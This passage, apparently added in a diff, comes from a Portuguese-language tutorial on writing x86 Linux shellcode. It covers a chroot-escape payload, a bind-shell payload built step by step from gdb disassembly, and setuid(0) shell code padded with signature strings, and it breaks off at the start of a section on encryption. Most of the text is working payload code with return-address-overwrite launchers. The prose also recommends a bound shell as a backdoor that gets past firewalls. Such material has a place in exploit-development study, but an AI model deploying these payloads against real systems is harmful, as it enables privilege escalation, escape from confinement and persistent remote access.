+  asmcat("\tmovb  $0xb,%al\n");
+
+  addhex(0x89);
+  addhex(0xf3);
+  asmcat("\tmovl  %esi,%ebx\n");
+
+  addhex(0x8d);
+  addhex(0x4e);
+  addhex(size);
+  addasm("\tleal  0x%x(%%esi),%%ecx\n", size);
+
+  addhex(0x8d);
+  addhex(0x56);
+  addhex(size + 4*num_params);
+  addasm("\tleal  0x%x(%%esi),%%edx\n", size + 4*num_params);
+
+  addhex(0xcd);
+  addhex(0x80);
+  asmcat("\tint   $0x80\n");
+
+  addhex(0x31);
+  addhex(0xdb);
+  asmcat("\txorl  %ebx,%ebx\n");
+
+  addhex(0x89);
+  addhex(0xd8);
+  asmcat("\tmovl  %ebx,%eax\n");
+
+  addhex(0x40);
+  asmcat("\tinc   %eax\n");
+
+  addhex(0xcd);
+  addhex(0x80);
+  asmcat("\tint   $0x80\n");
+
+  addhex(0xe8);
+  addhex((jmp+5) * -1);
+  addhex(0xff);
+  addhex(0xff);
+  addhex(0xff);
+  addasm("\tcall  -0x%x\n", jmp+5);
+
+  asmcat("\t.string \\\"");
+  asmcat(params);
+  asmcat("\\\"");
+
+  printf("\n-----------------( asm code )--\n\n");
+
+  printf("int main() {\n");
+  printf("\t__asm__(\"\n");
+  printf("%s\");\n", asmcode);
+  printf("}\n");
+
+  printhex();
+
+  printf("\n\n(by jamez for your profit)\n\n");
+
+}
+
+---------------------------------------------------------------------------
+
+Para automatizar a escrita de shellcodes de 'instrucoes' via linha de
+comando, creio que nao existe programa melhor que este.Mas eh importante
+nao ficar somente no uso destes programas 'fazedores de shellcode' e sim
+partir voce mesmo para a contrucao dos seus proprios shellcodes.
+
+
+2.2 - Quebrando chroot()
+-------------------------
+
+Na primeira parte deste tutorial vimos uma forma de como se quebrar chroot().
+Existem varios metodos para se conseguir este feito, mas os mais simples
+sao o que vou disponibilizar agora, e aquele demonstrado no tutorial 
+anterior.O shellcode abaixo foi feito pelo lamagra, e demonstra de forma
+simples, como se criar um shellcode para quebrar chroot(), voce pode
+aumentar o numero de ../ para cada caso.Analise abaixo o esquema dele:
+
+--------------------------- chroot_lamagra.c ------------------------------
+
+/* Shellcode para quebrar chroot() by lamagra.
+
+main :
+        pushl %ebp              # shcode recognition
+        #init
+        movl %esp,%ebp          # salva stackpointer
+        xorl %eax,%eax
+        xorl %ebx,%ebx          # reseta os registradores
+        xorl %ecx,%ecx
+
+        # setuid(0);
+        movb $0x17,%al          # 0x17 = __NR_setuid
+        int  $0x80
+
+        # setgid(0);
+        movb $0x2e,%al          # 0x2e = __BR_setgid
+        int  $0x80
+
+        # mkdir("sh");
+        jmp  0x39
+        popl %esi               # pega o endereco de nossa string
+        movb $0x27,%al          # 0x27 = __NR_mkdir
+        leal 0x5(%esi),%ebx     # locacao da string
+        movb $0xed,%cl          # modo
+        int  $0x80
+
+        # chroot("sh");
+        # string addiciona estah em %ebx
+        movb $0x3d, %al         # 0x3d = __NR_chroot
+        int  $0x80
+
+        # construindo string "../../../../../../../../../../"
+        movl $0xff2f2e2e,%edx   # "../"
+        leal 0x4(%ebp),%ebx     # adiciona sh na nova string
+        movb $0x10,%cl          # seta o contador
+        movl %edx,0x4(%ebp)     # constroi a string
+        addl $0x3,%ebp
+        loopne  -0x8
+        movl %ecx,0x4(%ebp)        # coloca em NULL
+
+        # chroot("../../../../../../../../../../");
+        movb $0x3d,%al          # Ox3d = __NR_chroot
+        int  $0x80
+
+        # arg[0] = "/bins/sh";
+        # arg[1] = 0x0
+        # execve(arg[0],arg);
+        movl %esi,%ebx
+        movl %esi,0x8(%ebp)
+        movl %ecx,0xc(%ebp)
+        movb $0xb,%al
+        leal 0x8(%ebp),%ecx
+        leal 0xc(%ebp),%edx
+        int  $0x80
+
+        call -0x3e
+        .string "/bin/sh"
+*/
+
+char shellcode[]=
+"\x55\x89\xe5\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\xb0\x2e\xcd\x80"
+"\xeb\x39\x5e\xb0\x27\x8d\x5e\x05\xb1\xed\xcd\x80\xb0\x3d\xcd\x80\xba"
+"\x2e\x2e\x2f\xff\x8d\x5d\x04\xb1\x10\x89\x55\x04\x83\xc5\x03\xe0\xf8"
+"\x89\x4d\x04\xb0\x3d\xcd\x80\x89\xf3\x89\x75\x08\x89\x4d\x0c\xb0\x0b"
+"\x8d\x4d\x08\x8d\x55\x0c\xcd\x80\xe8\xc2\xff\xff\xff/bin/sh";
+
+main(){
+int *retorno;
+retorno = (int *)&retorno + 2;
+(*retorno) = (int)shellcode;
+}
+
+--------------------------------------------------------------------------
+
+Ao meu ver, nao existe muita complicacao nesse shellcode.Se voce entendeu
+o exemplo descrito no tutorial anterio, esse daqui eh moleza na frente
+daquele.A utilidade disso voce jah sabe, eh justamente conseguir executar
+comandos fugindo do chroot(), que eh usado para nos 'prender' num 
+determinado diretorio.
+
+
+2.3 - Abrindo um Socket
+------------------------
+
+A abertura de um socket em uma rede pode vir a ser util.Bindar uma porta
+a uma shell por sih soh representa uma boa forma de backdoor.Dependendo
+da situacao, um shellcode que binda uma shell a uma porta pode vir a ser
+uma forma efetiva de fugir de firewalls.Esse conceito tem sido no momento
+muito usado em trojans horses, e como fucadores, devemos conhecer as 
+possiveis utilidades do mesmo.No tutorial "Advanced buffer overflow exploit", 
+o Taeho Oh demonstrou de forma clara, a "tecnica" usada para contruir um 
+shellcode capaz de bindar uma shell a uma porta.Vejamos o codigo em .c mais 
+simples para a construcao desse shellcode:
+
+----------------------------- binda.c ---------------------------------
+
+#include<unistd.h>
+#include<sys/socket.h>
+#include<netinet/in.h>
+
+int soc,cli;
+struct sockaddr_in serv_addr;
+
+int main()
+{
+        if(fork()==0)
+        {
+                serv_addr.sin_family=2;
+                serv_addr.sin_addr.s_addr=0;
+                serv_addr.sin_port=0x77;
+                soc=socket(2,1,6);
+                bind(soc,(struct sockaddr *)&serv_addr,0x10);
+                listen(soc,1);
+                cli=accept(soc,0,0);
+                dup2(cli,0);
+                dup2(cli,1);
+                dup2(cli,2);
+                execl("/bin/sh","sh",0);
+        }
+}
+
+-------------------------------------------------------------------------
+
+Se voce nao conhece programacao de sockets em C, recomendo meus tutoriais
+que podem ser obtidos em http://unsekurity.virtualave.net ou 
+http://unsekurity.cyberpunk.com.br/ ; lah eu explico em detalhes como se
+faz um programa parecido com este acima, que binda uma shell a uma porta.
+Compile este programa acima, e depois vamos desassemblar ele:
+
+[localhost]# gdb binda
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are 
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnu"...
+(gdb) (gdb) disassemble fork
+Dump of assembler code for function __libc_fork:
+0x804c5a0 <__libc_fork>:        mov    $0x2,%eax
+0x804c5a5 <__libc_fork+5>:      int    $0x80
+0x804c5a7 <__libc_fork+7>:      cmp    $0xfffff001,%eax
+0x804c5ac <__libc_fork+12>:     jae    0x804ca70 <__syscall_error>
+0x804c5b2 <__libc_fork+18>:     ret
+End of assembler dump.
+(gdb)
+
+Pegamos o codigo referente a fork(0):
+
+mov    $0x2,%eax
+int    $0x80
+
+(gdb) disass socket
+Dump of assembler code for function __socket:
+0x804c860 <__socket>:   mov    %ebx,%edx
+0x804c862 <__socket+2>: mov    $0x66,%eax
+0x804c867 <__socket+7>: mov    $0x1,%ebx
+0x804c86c <__socket+12>:        lea    0x4(%esp,1),%ecx
+0x804c870 <__socket+16>:        int    $0x80
+0x804c872 <__socket+18>:        mov    %edx,%ebx
+0x804c874 <__socket+20>:        cmp    $0xffffff83,%eax
+0x804c877 <__socket+23>:        jae    0x804ca70 <__syscall_error>
+0x804c87d <__socket+29>:        ret
+End of assembler dump.
+
+Pegamos os codigos referentes a funcao socket():
+
+mov    %ebx,%edx
+mov    $0x66,%eax
+mov    $0x1,%ebx
+lea    0x4(%esp,1),%ecx
+int    $0x80
+
+(gdb) disas bind
+Dump of assembler code for function bind:
+0x804c820 <bind>:       mov    %ebx,%edx
+0x804c822 <bind+2>:     mov    $0x66,%eax
+0x804c827 <bind+7>:     mov    $0x2,%ebx
+0x804c82c <bind+12>:    lea    0x4(%esp,1),%ecx
+0x804c830 <bind+16>:    int    $0x80
+0x804c832 <bind+18>:    mov    %edx,%ebx
+0x804c834 <bind+20>:    cmp    $0xffffff83,%eax
+0x804c837 <bind+23>:    jae    0x804ca70 <__syscall_error>
+0x804c83d <bind+29>:    ret
+End of assembler dump.
+
+Pegamos o codigo referente a bind():
+
+mov    %ebx,%edx
+mov    $0x66,%eax
+mov    $0x2,%ebx
+lea    0x4(%esp,1),%ecx
+int    $0x80
+
+(gdb) disas listen
+Dump of assembler code for function listen:
+0x804c840 <listen>:     mov    %ebx,%edx
+0x804c842 <listen+2>:   mov    $0x66,%eax
+0x804c847 <listen+7>:   mov    $0x4,%ebx
+0x804c84c <listen+12>:  lea    0x4(%esp,1),%ecx
+0x804c850 <listen+16>:  int    $0x80
+0x804c852 <listen+18>:  mov    %edx,%ebx
+0x804c854 <listen+20>:  cmp    $0xffffff83,%eax
+0x804c857 <listen+23>:  jae    0x804ca70 <__syscall_error>
+0x804c85d <listen+29>:  ret
+End of assembler dump.
+
+Pegamos o codigo referente a bind():
+
+mov    %ebx,%edx
+mov    $0x66,%eax
+mov    $0x4,%ebx
+0x4(%esp,1),%ecx
+int    $0x80
+
+(gdb) disas accept
+Dump of assembler code for function __libc_accept:
+0x804c800 <__libc_accept>:      mov    %ebx,%edx
+0x804c802 <__libc_accept+2>:    mov    $0x66,%eax
+0x804c807 <__libc_accept+7>:    mov    $0x5,%ebx
+0x804c80c <__libc_accept+12>:   lea    0x4(%esp,1),%ecx
+0x804c810 <__libc_accept+16>:   int    $0x80
+0x804c812 <__libc_accept+18>:   mov    %edx,%ebx
+0x804c814 <__libc_accept+20>:   cmp    $0xffffff83,%eax
+0x804c817 <__libc_accept+23>:   jae    0x804ca70 <__syscall_error>
+0x804c81d <__libc_accept+29>:   ret
+End of assembler dump.
+
+Pegamos o codigo referente a accept():
+
+mov    %ebx,%edx
+mov    $0x66,%eax
+mov    $0x5,%ebx
+lea    0x4(%esp,1),%ecx
+int    $0x80
+
+(gdb) disas dup2
+Dump of assembler code for function __dup2:
+0x804c6d0 <__dup2>:     mov    %ebx,%edx
+0x804c6d2 <__dup2+2>:   mov    0x8(%esp,1),%ecx
+0x804c6d6 <__dup2+6>:   mov    0x4(%esp,1),%ebx
+0x804c6da <__dup2+10>:  mov    $0x3f,%eax
+0x804c6df <__dup2+15>:  int    $0x80
+0x804c6e1 <__dup2+17>:  mov    %edx,%ebx
+0x804c6e3 <__dup2+19>:  cmp    $0xfffff001,%eax
+0x804c6e8 <__dup2+24>:  jae    0x804ca70 <__syscall_error>
+0x804c6ee <__dup2+30>:  ret
+End of assembler dump.
+
+Pegamos o codigo referente a dup2():
+
+mov    %ebx,%edx
+mov    0x8(%esp,1),%ecx
+mov    0x4(%esp,1),%ebx
+mov    $0x3f,%eax
+int    $0x80
+
+
+Como podemos notar, eh meio trabalhoso, mas maos a obra.Vamos retirar os
+NULL Bytes e melhorar nosso codigo funcao por funcao:
+
+fork(); /* fork() possui numero 2 na tabela de system calls */
+----------------------------------------------------------------------------
+char code[]=
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\xb0\x02"                      /* movb $0x2,%al         */
+        "\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+socket(2,1,6); 
+----------------------------------------------------------------------------
+        /* %ecx eh um ponteiro de todos os argumentos.           */
+char code[]=
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\x31\xdb"                      /* xorl %ebx,%ebx        */
+        "\x89\xf1"                      /* movl %esi,%ecx <- ele */
+        "\xb0\x02"                      /* movb $0x2,%al         */
+        "\x89\x06"                      /* movl %eax,(%esi)      */
+	/* O primeiro argumento(socket(2,..,..)).                */ 
+	/* %esi tem referencia ao espaco livre da memoria antes  */
+	/* de usar esta funcao.					 */
+        "\xb0\x01"                      /* movb $0x1,%al         */
+        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+        /* O segundo argumento(socket(..,1,..)).                 */
+        "\xb0\x06"                      /* movb $0x6,%al         */
+        "\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+        /* O terceiro argumento(socket(..,..,6)).                */
+        "\xb0\x66"                      /* movb $0x66,%al        */
+        "\xb3\x01"                      /* movb $0x1,%bl         */
+        "\xcd\x80";                     /* int $0x80             */
+
+
+bind(soc,(struct sockaddr *)&serv_addr,0x10); code
+----------------------------------------------------------------------------
+        /* %ecx eh um ponteiro para todos os argumentos          */
+char code[]=
+        "\x89\xf1"                      /* movl %esi,%ecx        */
+        "\x89\x06"                      /* movl %eax,(%esi)      */
+	/* %eax tem valor de soc antes de usar esta instrucao.   */
+	/* Acima temos o primeiro argumento(soc).                */
+        "\xb0\x02"                      /* movb $0x2,%al         */
+        "\x66\x89\x46\x0c"              /* movw %ax,0xc(%esi)    */
+        /* serv_addr.sin_family=2                                */
+	/* 2 eh armazenado em 0xc(%esi).			 */
+        "\xb0\x77"                      /* movb $0x77,%al        */
+        "\x66\x89\x46\x0e"              /* movw %ax,0xe(%esi)    */
+	/* armazena o numero da porta(0x77) em 0xe(%esi)         */
+        "\x8d\x46\x0c"                  /* leal 0xc(%esi),%eax   */
+	/* %eax =  endereco de serv_addr.			 */
+	/* O segundo argumento((struct sockaddr *)&serv_addr)    */
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\x89\x46\x10"                  /* movl %eax,0x10(%esi)  */
+        /* serv_addr.sin_addr.s_addr=0                           */
+        /* 0 eh armazenado em 0x10(%esi).                        */
+        "\xb0\x10"                      /* movb $0x10,%al        */
+        "\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+        /* O terceiro argumento                                  */
+        "\xb0\x66"                      /* movb $0x66,%al        */
+        "\xb3\x02"                      /* movb $0x2,%bl         */
+        "\xcd\x80";                     /* int $0x80             */
+
+listen(soc,1); code
+----------------------------------------------------------------------------
+        /* %ecx eh um ponteiro para todos os argumentos.         */
+char code[]=
+        "\x89\xf1"                      /* movl %esi,%ecx        */
+        "\x89\x06"                      /* movl %eax,(%esi)      */
+        /* %eax tem o valor de soc antes de usar esta intrucao.  */
+        /* O primeiro argumento.                                 */
+        "\xb0\x01"                      /* movb $0x1,%al         */
+        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+        /* O segundo argumento.                                  */
+        "\xb0\x66"                      /* movb $0x66,%al        */
+        "\xb3\x04"                      /* movb $0x4,%bl         */
+        "\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+accept(soc,0,0); code
+----------------------------------------------------------------------------
+        /* %ecx eh um ponteiro de todos os argumentos.           */
+char code[]=
+        "\x89\xf1"                      /* movl %esi,%ecx        */
+        "\x89\xf1"                      /* movl %eax,(%esi)      */
+        /* %eax tem que ter valor soc antes de usar esta         */
+        /* instrucao.                                            */
+        /* Acima temos o primeiro argumento                      */
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	/* Acima temos o segundo argumento			 */
+        "\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+        /* Acima temos o terceiro argumento.                     */
+        "\xb0\x66"                      /* movb $0x66,%al        */
+        "\xb3\x05"                      /* movb $0x5,%bl         */
+        "\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+dup2(cli,0); code
+----------------------------------------------------------------------------
+	/* O primeiro argumento eh %ebx e o segundo argumento eh */
+	/* %ecx.						 */
+char code[]=
+	/* %eax tem que ter valor de cli antes de usar esta      */
+	/* instrucao.						 */
+        "\x88\xc3"                      /* movb %al,%bl          */
+        "\xb0\x3f"                      /* movb $0x3f,%al        */
+        "\x31\xc9"                      /* xorl %ecx,%ecx        */
+        "\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+Bastante trabalhoso, nao?? A melhor forma de execucao do mesmo segue
+no proprio esquema do Taeho Oh.Vejamos abaixo o shellcode que ele criou
+para bindar uma shell:
+
+----------------------------------------------------------------------------
+char shellcode[]=
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\xb0\x02"                      /* movb $0x2,%al         */
+        "\xcd\x80"                      /* int $0x80             */
+        "\x85\xc0"                      /* testl %eax,%eax       */
+        "\x75\x43"                      /* jne 0x43              */
+        /* caso fork()!=0                                        */
+	/* Ele irah chamar exit(0) e jumpear abaixo.		 */
+        "\xeb\x43"                      /* jmp 0x43              */
+	/* Caso fork() == 0 ele irah chamar call -0xa5.		 */
+        "\x5e"                          /* popl %esi             */
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\x31\xdb"                      /* xorl %ebx,%ebx        */
+        "\x89\xf1"                      /* movl %esi,%ecx        */
+        "\xb0\x02"                      /* movb $0x2,%al         */
+        "\x89\x06"                      /* movl %eax,(%esi)      */
+        "\xb0\x01"                      /* movb $0x1,%al         */
+        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+        "\xb0\x06"                      /* movb $0x6,%al         */
+        "\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+        "\xb0\x66"                      /* movb $0x66,%al        */
+        "\xb3\x01"                      /* movb $0x1,%bl         */
+        "\xcd\x80"                      /* int $0x80             */
+        "\x89\x06"                      /* movl %eax,(%esi)      */
+        "\xb0\x02"                      /* movb $0x2,%al         */
+        "\x66\x89\x46\x0c"              /* movw %ax,0xc(%esi)    */
+        "\xb0\x77"                      /* movb $0x77,%al        */
+        "\x66\x89\x46\x0e"              /* movw %ax,0xe(%esi)    */
+        "\x8d\x46\x0c"                  /* leal 0xc(%esi),%eax   */
+        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\x89\x46\x10"                  /* movl %eax,0x10(%esi)  */
+        "\xb0\x10"                      /* movb $0x10,%al        */
+        "\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+        "\xb0\x66"                      /* movb $0x66,%al        */
+        "\xb3\x02"                      /* movb $0x2,%bl         */
+        "\xcd\x80"                      /* int $0x80             */
+        "\xeb\x04"                      /* jmp 0x4               */
+        "\xeb\x55"                      /* jmp 0x55              */
+        "\xeb\x5b"                      /* jmp 0x5b              */
+        "\xb0\x01"                      /* movb $0x1,%al         */
+        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+        "\xb0\x66"                      /* movb $0x66,%al        */
+        "\xb3\x04"                      /* movb $0x4,%bl         */
+        "\xcd\x80"                      /* int $0x80             */
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+        "\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+        "\xb0\x66"                      /* movb $0x66,%al        */
+        "\xb3\x05"                      /* movb $0x5,%bl         */
+        "\xcd\x80"                      /* int $0x80             */
+        "\x88\xc3"                      /* movb %al,%bl          */
+        "\xb0\x3f"                      /* movb $0x3f,%al        */
+        "\x31\xc9"                      /* xorl %ecx,%ecx        */
+        "\xcd\x80"                      /* int $0x80             */
+        "\xb0\x3f"                      /* movb $0x3f,%al        */
+        "\xb1\x01"                      /* movb $0x1,%cl         */
+        "\xcd\x80"                      /* int $0x80             */
+        "\xb0\x3f"                      /* movb $0x3f,%al        */
+        "\xb1\x02"                      /* movb $0x2,%cl         */
+        "\xcd\x80"                      /* int $0x80             */
+        "\xb8\x2f\x62\x69\x6e"          /* movl $0x6e69622f,%eax */
+        /* %eax="/bin"                                           */
+        "\x89\x06"                      /* movl %eax,(%esi)      */
+        "\xb8\x2f\x73\x68\x2f"          /* movl $0x2f68732f,%eax */
+        /* %eax="/sh/"                                           */
+        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\x88\x46\x07"                  /* movb %al,0x7(%esi)    */
+        "\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
+        "\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
+        "\xb0\x0b"                      /* movb $0xb,%al         */
+        "\x89\xf3"                      /* movl %esi,%ebx        */
+        "\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
+        "\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
+        "\xcd\x80"                      /* int $0x80             */
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\xb0\x01"                      /* movb $0x1,%al         */
+        "\x31\xdb"                      /* xorl %ebx,%ebx        */
+        "\xcd\x80"                      /* int $0x80             */
+        "\xe8\x5b\xff\xff\xff";         /* call -0xa5            */
+
+main(){
+int *retorno;
+retorno = (int *)&retorno +2;
+(*retorno) = (int)shellcode;
+}
+----------------------------------------------------------------------------
+
+Enorme, nao? Compile ele e execute em sua maquina, ele abrirah uma porta
+de numero 30464 (que pode ser perfeitamente alterada) com uma shell
+correspondente.
+
+
+2.4 - Personalizando um Shellcode
+----------------------------------
+
+Muitos shellcodes sao personalizados de forma que fazem com que aparecam
+determinadas frases ou letras quando se usa o comando strings.A utilidade
+disso, ao meu ver, nao eh muita coisa.Muita gente que nao conhece escrita
+de shellcode acha isso coisa de outro mundo, o que vou demonstrar aqui, eh
+que isso eh muito simples.Lendo esse item, voce verah que esse 'mito' nao
+passa de mais um simples exemplo da obscuridade que envolve a escrita de 
+shellcodes.Exploits como os da ADM(http://adm.isp.at/) demonstram na pratica
+este 'conceito'.Essa parte realmente nao tem nada de util, apenas servirah
+para mostrar a todos que nao eh nada complicado personalizar um shellcode.
+
+Como bem sabemos, o shellcode soh executa intrucoes pre-determinadas pelo
+tamanho do comando que nos queremos executar.Vimos na primeira parte deste
+tutorial que nos poderiamos encher o final do shellcode que executava ls,
+mas que nao iria adiantar de nada.Personalizar um shellcode eh somente
+colocar os referentes caracters ascii(em hexa) no final do shellcode de
+modo que nao afete a execucao do mesmo.
+
+Vamos pegar como exemplo o shellcode padrao abaixo:
+
+---------------------------- spadrao.c ---------------------------------
+#include <stdio.h>
+#include <stdlib.h>
+
+char shellcode[] =
+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80" /* setuid(0) */
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+main(){
+int *retorno;
+retorno = (int *)&retorno +2;
+(*retorno) = (int)shellcode;
+}
+------------------------------------------------------------------------
+
+Shellcode padrao que executa um setuid(0) em seguida um /bin/sh.Compile
+ele normalmente e depois digite em seu linux 'strings spadrao | less',
+voce deverah ver algo como:
+
+....(monte de coisas)..
+GLIBC_2.0
+PTRh
+/bin/sh
+init.c
+.....
+
+O que nos interessa eh essa parte.Abaixo de PTRh encontrasse as strings
+que nosso shellcode possui, no caso /bin/sh.Personalizar um shellcode, 
+nada mais eh do que fazer aparecer frases ou palavras nessa parte do
+comando strings, isso seria algo como uma assinatura, ou uma marca
+registrada de que aquele shellcode foi feito ou alterado por voce.Vejamos
+como fazer isso:
+
+Em seu linux, digite o comando 'man ascii':
+
+[localhost]# man ascii
+..........................................................................
+
+       Oct   Dec   Hex   Char           Oct   Dec   Hex   Char
+       ------------------------------------------------------------
+       000   0     00    NUL '\0'       100   64    40    @
+       001   1     01    SOH            101   65    41    A
+       002   2     02    STX            102   66    42    B
+       003   3     03    ETX            103   67    43    C
+       004   4     04    EOT            104   68    44    D
+       005   5     05    ENQ            105   69    45    E
+       006   6     06    ACK            106   70    46    F
+       007   7     07    BEL '\a'       107   71    47    G
+       010   8     08    BS  '\b'       110   72    48    H
+       011   9     09    HT  '\t'       111   73    49    I
+       012   10    0A    LF  '\n'       112   74    4A    J
+       013   11    0B    VT  '\v'       113   75    4B    K
+       014   12    0C    FF  '\f'       114   76    4C    L
+       015   13    0D    CR  '\r'       115   77    4D    M
+       016   14    0E    SO             116   78    4E    N
+       017   15    0F    SI             117   79    4F    O
+       020   16    10    DLE            120   80    50    P
+       021   17    11    DC1            121   81    51    Q
+       022   18    12    DC2            122   82    52    R
+       023   19    13    DC3            123   83    53    S
+       024   20    14    DC4            124   84    54    T
+       025   21    15    NAK            125   85    55    U
+       026   22    16    SYN            126   86    56    V
+       027   23    17    ETB            127   87    57    W
+       030   24    18    CAN            130   88    58    X
+       031   25    19    EM             131   89    59    Y
+       032   26    1A    SUB            132   90    5A    Z
+       033   27    1B    ESC            133   91    5B    [
+       034   28    1C    FS             134   92    5C    \   '\\'
+       035   29    1D    GS             135   93    5D    ]
+       036   30    1E    RS             136   94    5E    ^
+       037   31    1F    US             137   95    5F    _
+       040   32    20    SPACE          140   96    60    `
+       041   33    21    !              141   97    61    a
+       042   34    22    "              142   98    62    b
+       043   35    23    #              143   99    63    c
+       044   36    24    $              144   100   64    d
+       045   37    25    %              145   101   65    e
+       046   38    26    &              146   102   66    f
+       047   39    27    '              147   103   67    g
+       050   40    28    (              150   104   68    h
+       051   41    29    )              151   105   69    i
+       052   42    2A    *              152   106   6A    j
+       053   43    2B    +              153   107   6B    k
+       054   44    2C    ,              154   108   6C    l
+       055   45    2D    -              155   109   6D    m
+       056   46    2E    .              156   110   6E    n
+       057   47    2F    /              157   111   6F    o
+       060   48    30    0              160   112   70    p
+       061   49    31    1              161   113   71    q
+       062   50    32    2              162   114   72    r
+       063   51    33    3              163   115   73    s
+       064   52    34    4              164   116   74    t
+       065   53    35    5              165   117   75    u
+       066   54    36    6              166   118   76    v
+       067   55    37    7              167   119   77    w
+       070   56    38    8              170   120   78    x
+       071   57    39    9              171   121   79    y
+       072   58    3A    :              172   122   7A    z
+       073   59    3B    ;              173   123   7B    {
+       074   60    3C    <              174   124   7C    |
+       075   61    3D    =              175   125   7D    }
+       076   62    3E    >              176   126   7E    ~
+       077   63    3F    ?              177   127   7F    DEL
+
+...........................................................................
+
+
+
+Acima segue um pedaco da tabela que aparece com esse comando.Essa tabela
+nos fornece os respectivos numeros em decimal, hexadecimal e octal dos
+caracteres ascii correspondente.De posse dessas informacoes, podemos
+pegar os numeros hexadecimais da string que queremos inserir:
+
+N = 4e ; A = 41 ; S = 53 ; H = 48 ; L = 4c ; E = 45 ; O = 4f ; N = 4e.
+
+Agora tudo que temos que fazer eh inserir os respectivos hexas no final
+do shellcode.Vejamos:
+
+------------------------------spers1.c-----------------------------------
+#include <stdio.h>
+#include <stdlib.h>
+
+char shellcode[] =
+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80" /* setuid(0) */
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+"\x4e\x41\x53\x48\x4c\x45\x4f\x4e"; /* NASHLEON */
+
+main(){
+int *retorno;
+retorno = (int *)&retorno +2;
+(*retorno) = (int)shellcode;
+}
+
+--------------------------------------------------------------------------
+
+Compile ele normalmente e depois use o comando strings:
+
+[localhost]# strings spers1 | less
+.....
+GLIBC_2.0
+PTRh
+/bin/shNASHLEON
+init.c
+.....
+
+Voce pode notar que nossa string 'NASHLEON' ficou logo apos /bin/sh.
+Podemos perfeitamente melhorar isto, basta inserir os hexas referentes aos
+caracteres ascii que quisermos.Um outro exemplo segue abaixo:
+
+-------------------------------spers2.c-----------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+
+char shellcode[] =
+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80" /* setuid(0) */
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+"\x00\x4e\x41\x53\x48\x20\x4c\x45\x4f\x4e\x00" /* NASH LEON */
+"\x76\x75\x6c\x67\x6f\x20" /* vulgo */
+"\x63\x6f\x72\x61\x63\x61\x6f\x64\x65\x6c\x65\x61\x6f";
+
+main(){
+int *retorno;
+retorno = (int *)&retorno +2;
+(*retorno) = (int)shellcode;
+}
+------------------------------------------------------------------------
+
+Compile e use o comando strings para obter info a respeito das strings
+que se encontram no shellcode:
+.....
+GLIBC_2.0
+PTRh
+/bin/sh
+NASH LEON
+vulgo coracaodeleao
+init.c
+....
+
+Bom, amigo, se voce quer mesmo, mande brasa e construa seus shellcodes
+personalizados.Eu particularmente nao aconselho por varios motivos:
+
++ Quanto menor o tamanho do shellcode, melhor. Principalmente quando se
+  tenta exploitar buffers de tamanhos pequenos.
+
++ Existem casos em que o shellcode necessita ficar entre nops:
+  [NOPS] [SHELLCODE] [NOPS] [offset para shellcode]
+  ou
+  [NOPS] [SHELLCODE] [NOPS] [offset] [NULL's]
+  ou mesmo mais complexo ainda:
+  [offset para shellcode] [NULL's] ] [nops] [SHELLCODE] [nops]
+
+Como voce pode ver, isso pode vir a dificultar mais ainda a execucao de
+nosso shellcode, analise o caso, e veja se realmente a personalizacao
+de um shellcode nao trarah mais trabalhos para voce.
+
+
+2.5 - Encriptando um Shellcode
+-------------------------------
+
+O perigo de se executar exploits que usam shellcodes de terceiros como root
